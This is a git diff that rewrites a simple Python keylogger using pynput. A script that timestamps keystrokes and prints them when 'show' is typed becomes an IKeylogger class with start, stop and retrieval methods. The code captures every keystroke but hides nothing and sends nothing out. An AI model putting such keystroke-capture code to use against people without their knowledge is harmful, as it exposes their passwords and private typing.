@@ -1,50 +1,33 @@
 from pynput import keyboard
-from datetime import datetime
-dict1 = {
-    "Key.space": " ",
-    "Key.backspace":"backspace",
-    "Key.enter": "enter"
-}
-current_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-list1 = []
+import time
 
-def on_press(key):
-    try:
-        tempKey = key.char
+class IKeylogger:
+    def __init__(self):
+        self.my_list = []
+        self.Listener = None
 
-    except AttributeError:
-        tempKey = str(key)
-        if tempKey in dict1:
-            tempKey = dict1[tempKey]
-        else:
-            tempKey = " '" + tempKey + "' "
-        if spacial_keys(tempKey):
-            return
-    add_to_file(tempKey)
+    def on_press(self,key):
+        try:
+            tempKey = str(key.char)
+        except AttributeError:
+            tempKey = key
+            if tempKey == keyboard.Key.backspace:
+                self.my_list = self.my_list[:-1]
+                return
+            elif tempKey == keyboard.Key.enter:
+                tempKey = '\n'
+            elif tempKey == keyboard.Key.space:
+                tempKey = " "
+            else:
+                tempKey = str(tempKey)
+        self.my_list.append(tempKey)
 
-def spacial_keys(tempKey):
-    global list1
-    if tempKey == "backspace":
-        list1 = list1[:-1]
-        return
-    elif tempKey == "enter":
-        list1.append('\n')
-        return
-    return
+    def start_logging(self):
+        self.Listener = keyboard.Listener(on_press= self.on_press)
+        self.Listener.start()
 
-def add_to_file(tempKey):
-    global current_time, list1
-    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
-    if tempTime != current_time:
-        list1.append("\n***** " + tempTime + " *****\n")
-    list1.append(tempKey)
-    if list1[-4:] == ["s","h","o","w"]:
-        print("\n***** " + current_time + " *****")
-        print("".join(list1[:-4]))
-        list1 = []
+    def stop_logging(self):
+        self.Listener.stop()
 
-listener = keyboard.Listener(on_press = on_press)
-listener.start()
-listener.join()
-
-print(5)
+    def get_logged_keys(self):
+        return "".join(self.my_list)
